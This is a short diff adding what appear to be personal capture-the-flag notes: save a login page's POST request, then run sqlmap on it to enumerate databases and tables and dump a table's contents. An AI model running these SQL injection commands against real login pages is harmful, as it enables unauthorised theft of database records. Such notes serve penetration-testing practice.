@@ -1,0 +1,7 @@
+Capture post request to login page an save as name.req
+run:
+sqlmap -r name.req
+sqlmap -r name.req --dbs
+sqlmap -r name.req -D namedbs --tables
+sqlmap -r goodgames.req -D namedbs -T nametable --dump
+
